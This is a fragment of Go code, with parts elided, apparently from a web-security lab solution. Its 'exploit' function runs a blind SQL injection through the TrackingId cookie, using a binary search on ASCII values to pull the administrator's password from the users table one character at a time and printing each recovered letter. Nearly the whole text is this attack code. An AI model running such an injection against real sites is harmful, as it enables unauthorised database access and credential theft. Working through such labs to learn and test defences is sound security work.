...
func exploit(targetUrl string, session string, trackingId string, index_password int, client *http.Client) {
	...
	for {
		...
		trackingIdCookie := fmt.Sprintf("TrackingId=%s' AND ascii(SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), %d, 1)) >= '%d;", trackingId, index_password, mid)
	...
	if found {
		letra := string(rune(end))
		fmt.Printf("Letra %d = %s\n", index_password, letra)
		password[index_password-1] = string(rune(end))
	}
